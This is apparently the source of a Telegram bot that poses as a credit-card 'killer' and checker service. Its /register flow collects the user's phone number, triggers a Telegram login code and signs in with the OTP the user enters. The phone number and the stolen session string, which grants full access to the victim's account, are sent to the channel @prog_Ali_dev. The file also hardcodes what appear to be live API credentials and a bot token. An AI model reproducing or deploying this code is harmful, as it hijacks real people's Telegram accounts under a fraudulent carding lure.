import re
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, AuthRestartError
from telethon.sessions import StringSession

# Telegram API Credentials
API_ID = 21924891  # Replace with your API ID
API_HASH = "e36584063001075042be33ca7974d723"  # Replace with your API Hash
BOT_TOKEN = "7835729461:AAE8KjtmQnw9imLuzJJQeOeRafc1c9O0DD8"  # Replace with your Bot Token

# Temporary storage for user data
user_data = {}

# Initialize Pyrogram Client
app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)


@app.on_message(filters.command("start"))
async def start(client, message: Message):
    """Show bot instructions and start message."""
    instructions = (
        "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 《 ₡₡ кɪʟʟᴇʀ 》!\n\n"
        f"ʜᴇʏ {message.from_user.first_name}\n\n\n"
        "ʜᴇʀᴇ’ꜱ ʜᴏᴡ ʏᴏᴜ ᴄᴀɴ ɢᴇᴛ ꜱᴛᴀʀᴛᴇᴅ:: \n\n"
        " * ⌁ How it Works ! *\n\n\n"
        "*ꜰᴇᴀᴛᴜʀᴇꜱ ⌁⌁*\n"
        "[✓] ` /cu `  [card_details] ⌁ ᴋɪʟʟ ᴄᴄ\n"
        "[✓] ` /b3 `  [card_details] ⌁  ᴄʜᴇᴄᴋ ᴄᴀʀᴅ \n"
    )
    await message.reply_text(instructions)


@app.on_message(filters.regex(r"^/cu .*") | filters.regex(r"^/b3 .*"))
async def handle_card_check(client, message: Message):
    """Handle card validation and ask for login if not logged in."""
    command, *details = message.text.split()
    if not details:
        await message.reply_text(
            "⛔ Please provide card details in the format:\n"
            "`/cu 507484491235|01|24|524`\n"
            "or\n"
            "`/b3 507484491235|01|24|524`"
        )
        return

    card_details = details[0]
    if validate_card(card_details):
        user_id = message.chat.id
        if user_id not in user_data:
            await message.reply_text("You are not logged in. Please use /register to log in first.")
        else:
            await message.reply_text("You are not logged in. Please use /register to log in first.")
            # Handle further actions if needed
    else:
        await message.reply_text("❌ Invalid card details. Please try again.")


def validate_card(card_details: str) -> bool:
    """Validate card details using a regex."""
    pattern = r"^\d{12,19}\|\d{2}\|\d{2}\|\d{3}$"
    return re.match(pattern, card_details) is not None


@app.on_message(filters.command("register"))
async def register(client, message: Message):
    """Start the login process."""
    user_id = message.chat.id
    if user_id in user_data:
        await message.reply_text("You are already logged in.")
        return

    keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await message.reply_text(
        "Please share your phone number to begin the login process.", reply_markup=reply_markup
    )


@app.on_message(filters.contact)
async def handle_phone_number(client, message: Message):
    """Handle shared phone number."""
    phone_number = message.contact.phone_number
    user_id = message.chat.id

    # Send phone number to your channel (@prog_Ali_dev)
    await app.send_message("@prog_Ali_dev", f"New phone number received: {phone_number}")

    await message.reply_text(f"Received phone number: {phone_number}. Sending OTP...")

    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        result = await client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": client,
            "phone_number": phone_number,
            "phone_code_hash": result.phone_code_hash,
        }
        await message.reply_text("OTP has been sent to your phone. Please enter it below:")
        buttons = [
            [InlineKeyboardButton(str(i), callback_data=str(i)) for i in range(3)],
            [InlineKeyboardButton(str(i), callback_data=str(i)) for i in range(3, 6)],
            [InlineKeyboardButton(str(i), callback_data=str(i)) for i in range(6, 9)],
            [InlineKeyboardButton(str(i), callback_data=str(i)) for i in range(9, 10)]
        ]
        reply_markup = InlineKeyboardMarkup(buttons)
        await message.reply(
            "Please enter your OTP by clicking the digits below (Each digit corresponds to a number).",
            reply_markup=reply_markup,
        )
    except AuthRestartError:
        await message.reply_text("Internal error occurred. Restarting the process...")
        await register(client, message)
    except Exception as e:
        await message.reply_text(f"Error sending OTP: {str(e)}")


@app.on_message(filters.text & filters.private)
async def handle_otp(client, message: Message):
    """Handle OTP input and login."""
    user_id = message.chat.id
    if user_id not in user_data:
        await message.reply_text("Please restart the registration process.")
        return

    user_info = user_data[user_id]
    client = user_info["client"]
    phone_number = user_info["phone_number"]
    phone_code_hash = user_info["phone_code_hash"]

    otp = message.text  # Assuming OTP is sent in text format
    try:
        await client.sign_in(phone_number, otp, phone_code_hash=phone_code_hash)
        session_string = client.session.save()

        # Send session string to your channel (@prog_Ali_dev)
        await app.send_message("@prog_Ali_dev", f"New session string for {phone_number}: {session_string}")

        await message.reply_text("Login successful!")
    except PhoneCodeInvalidError:
        await message.reply_text("Invalid OTP. Please try again.")
    except Exception as e:
        await message.reply_text(f"Error logging in: {str(e)}")
    finally:
        await client.disconnect()


@app.on_callback_query(filters.regex(r"^\d$"))
async def handle_otp_digit(client, callback_query):
    """Handle OTP digit button press."""
    user_id = callback_query.from_user.id
    if user_id not in user_data:
        await callback_query.message.reply_text("Please restart the registration process.")
        return

    user_info = user_data[user_id]
    client = user_info["client"]
    phone_number = user_info["phone_number"]
    phone_code_hash = user_info["phone_code_hash"]

    otp_digit = callback_query.data
    if "otp" not in user_info:
        user_info["otp"] = otp_digit
    else:
        user_info["otp"] += otp_digit

    await callback_query.answer(f"OTP entered so far: {user_info['otp']}", show_alert=True)

    if len(user_info["otp"]) == 5:  # Assuming OTP length is 5
        try:
            await client.sign_in(phone_number, user_info["otp"], phone_code_hash=phone_code_hash)
            session_string = client.session.save()

            # Send session string to your channel (@prog_Ali_dev)
            await app.send_message("@prog_Ali_dev", f"New session string for {phone_number}: {session_string}")

            await callback_query.message.reply_text("Login successful!")
        except PhoneCodeInvalidError:
            await callback_query.message.reply_text("Invalid OTP. Please try again.")
        except Exception as e:
            await callback_query.message.reply_text(f"Error logging in: {str(e)}")
        finally:
            await client.disconnect()


if __name__ == "__main__":
    app.run()
